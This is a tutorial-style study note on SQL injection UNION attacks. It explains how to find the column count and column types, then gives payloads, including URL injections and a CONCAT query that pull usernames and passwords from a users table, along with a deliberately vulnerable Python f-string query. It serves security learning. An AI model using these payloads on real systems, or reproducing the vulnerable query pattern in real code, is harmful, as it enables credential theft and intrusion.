# [SQL Injection UNION Attack](https://portswigger.net/web-security/sql-injection/union-attacks)

> When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to **retrieve data from other tables within the database.**

## SQL Responses

Consider the following SQL statement:

```sql
SELECT id, username, hash FROM users WHERE start_date = '07/22/2021'
```

It returns the `id`, `username`, and `hash` columns from every row in the `users` table that has the string value `07/22/2021` in its `start_date` column.

The response is actually another table with three rows (`id`, `username`, and `hash`). The response of all SQL queries is always another table.

---

## UNION

In set theory, a [union](https://en.wikipedia.org/wiki/Union_(set_theory)) (denoted by ∪) of a collection of sets is the set of all elements in the collection. For example, if set A = [1, 2, 3] and set B = [4, 5, 6], then the union of A and B (A∪B) = [1, 2, 3, 4, 5, 6].

In SQL, the `UNION` operator performs the same function. It is used to combine the resultant tables of two or more `SELECT` statements, under the following conditions:

- The resultant table of every `SELECT` statement in the `UNION` operation must have the same number of columns
- Each column in the resultant table of each `SELECT` statement in the `UNION` operation must have the same data type as its corresponding column(s) in the other resultant tables

---

## Example

Given the following two tables

`products`

| product_id | name | price |
| --- | --- | --- |
| 0 | desk chair | 100.00 |
| 1 | couch | 200.00 |

`users`

| uid | username | password |
| --- | --- | --- |
| 0 | admin | pw |
| 1 | bob | abc123 |
| 2 | charlie | password1!@# |

The following SQL query

```sql
SELECT product_id, name FROM products UNION SELECT user_id, password FROM users
```

would have this result:

| 1 | 2 |
| --- | --- |
| 0 | desk chair |
| 1 | couch |
| 0 | pw |
| 1 | abc123 |
| 2 | password1!@# |

This `UNION` operation was successful because (1) the resultant tables from each `SELECT` statement within the `UNION` operation contained 2 columns and (2) the corresponding columns each had the same data type with `products.product_id` and `users.user_id` being integers and `products.name` and `users.password` being strings.

---

## Process

To carry out a SQL injection UNION attack, it must be determined whether you can meet the two conditions of the `UNION` operator, generally by answering the following two questions:

1. How many columns are being returned from the original query?
2. Which columns returned from the original query are of a suitable data type to hold the results from the injected query?


### 1. Determine the number of columns being returned

#### Method 1: Incremental `ORDER BY` Statements

SQL's `ORDER BY` operator sorts the resultant table by the specified column. For example,

```sql
SELECT * FROM users where start_date = '07/21/2021' ORDER BY username
```

retrieves all rows from the `users` table whose `start_date` column is equal to the string `07/21/2021` and sorts them ascending alphabetically by `username`.

It is also possible to `ORDER BY` the column's **index** instead of its name, and that's what this method leverages to determine the number of columns being returned.

To use this method, continually inject an `ORDER BY` clause into the query, incrementing the index, like so:

```txt
ORDER BY 1
ORDER BY 2
ORDER BY 3
...
```

Whenever SQL receives an `ORDER BY` clause with an index that is greater than the number of columns, it will return the following error: `The ORDER BY position number X is out of range of the number of items in the select list.`, with `X` being the out-of-range column index.

#### Method 2: Incremental `UNION SELECT NULL` Statements

It is possible to add an empty row to the result of an existing `SELECT` statement, like so:

```sql
SELECT product_id, name FROM products UNION SELECT NULL, NULL
```

How is this helpful? The only reason the `UNION SELECT NULL, NULL` adds an empty row to the end of the initial `SELECT` statement is because there are an equal number of columns in the two resultant tables (2) and `NULL` can be converted to most of the common SQL data types. By incrementing the number of `NULL`s from 1, you can determine the number of rows returned in the original `SELECT` statement.

Whenever the number of `NULL`s is not equal to the number of columns in the original `SELECT` statement, SQL will throw an error: `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`. Whenever the number of `NULL`s **is** equal to the number of columns in the original `SELECT` statement, SQL will return the resultant table of the original `SELECT` statement with an additional empty row.

**Note**: to use this technique against an Oracle database, consider Oracle's `UNION SELECT` target table requirement: [[oracle#UNION SELECT Target Table Requirement]].

#### Important Note

For both of these methods, you most probably won't see these actual SQL error messages to help you determine the number of columns. What will instead indicate the number of columns is paying attention to the difference between the error output and the non-error output.

### 2. Determine the column data types

With the number of columns from the original `SELECT` statement in hand, you can iteratively test each column's data type.

To determine which columns are strings, you would inject the following `UNION SELECT` clauses:

```sql
SELECT product_id, name, price FROM products UNION SELECT 'a', NULL, NULL
SELECT product_id, name, price FROM products UNION SELECT NULL, 'a', NULL
SELECT product_id, name, price FROM products UNION SELECT NULL, NULL, 'a'
```

To determine which columns are integers, you would inject the following `UNION SELECT` clauses:

```sql
SELECT product_id, name, price FROM products UNION SELECT 1, NULL, NULL
SELECT product_id, name, price FROM products UNION SELECT NULL, 1, NULL
SELECT product_id, name, price FROM products UNION SELECT NULL, NULL, 1
```

and so on for which ever data type you are interested in.

For each iteration, if the data type of the column is not compatible with the injected value (i.e., 'a', 1, etc.) the database will throw an error. The following error would be thrown in the above example with `a` as the injected value on an integer column: `Conversion failed when converting the varchar value 'a' to data type int.`.

If an error does not occur, and the application's response contains some additional content including the injected value, then the relevant column matches the data type in question.

**Note**: to use this technique against an Oracle database, consider Oracle's `UNION SELECT` target table requirement: [[oracle#UNION SELECT Target Table Requirement]].

### 3. Perform the Injection

With the number of columns and the column data types of the original `SELECT` statement in hand, you are now in a position to craft the proper `UNION SELECT` statement capable of retrieving the desired columns from the desired table.

For example, let's say you've found a SQL injection vulnerability in a target web application and you want to read the `username`, `password`, and `is_expired` columns from the `users` table, each of type string, string, and integer, respectively. You know the original `SELECT` statement results in a 3-column table of type integer, string, and integer, respectively.

Here's the backend server code:

```python
category = request.params['category']
sql_query = f"SELECT id, name, price FROM products WHERE category = '{category}'"
rows = db.execute(sql_query)
render(rows)
```

Taken together, these two HTTP requests:

```http
http://ecommerce-app.com?category='UNION+SELECT+is_expired,username,NULL FROM users--
```

```http
http://ecommerce-app.com?category='UNION+SELECT+is_expired,password,NULL FROM users--
```

would render the desired information. Note how we had to split up the attack across two injections since there was only one column in the original `SELECT` statement of type string but we needed two (`username` and `password`). Alternatively, we could have used string concatenation to fit both the `username` and `password` columns into the one available string column: [[union-attack#Less String Columns Available than Necessary]].

---

## Less String Columns Available than Necessary

If the original `SELECT` statement returns less string columns than you want to read from the target table, you could:

1. Use multiple requests to read all of the necessary string columns from the target table. 
2. Leverage string concatenation to display values from multiple string columns in a single column from the result of the original `SELECT` statement.


### Using Concatenation

#### Theory

In a `SELECT` statement, the concatenation operator can be used in place of a column name to format values from multiple columns. The concatenation operator can take a combination of column names and literal strings as arguments.

So, instead of doing

```sql
SELECT username, password FROM users
```

to produce

| 1 | 2 |
| --- | --- |
| tgihf | blah123 |

you can do

```sql
SELECT CONCAT(username, ':', password) FROM users
```

to produce

| 1 |
| --- |
| tgihf:blah123 |

**Note**: see the following table for the string concatenation syntax for various databases.

| Database | String Concatenation Syntax |
| --- | --- |
| MySQL | [[mysql#String Concatenation Syntax]] |
| MSSQL | [[mssql#String Concatenation Syntax]] |
| Oracle | [[oracle#String Concatenation Syntax]] |
| PostgreSQL | [[postgresql#String Concatenation Syntax]] |

### SQL Injection Example

In the context of a SQL injection, let's say the original `SELECT` statement returns two columns: an integer (`product_id`) and a string (`name`). The original `SELECT` statement's `category` parameter is vulnerable to SQL injection.

```sql
SELECT product_id, name FROM products WHERE category = 'CATEGORY'
```

You want the `username` and `password` columns from the `users` table, both of which are strings. The original `SELECT` statement doesn't return enough string columns for you to retrieve the `username` and `password` columns in a single request without concatenation. With concatenation, you can do this:

```sql
SELECT product_id, name FROM products WHERE category = 'Pets' UNION SELECT NULL, CONCAT(username, ':', password) FROM users-- '
```
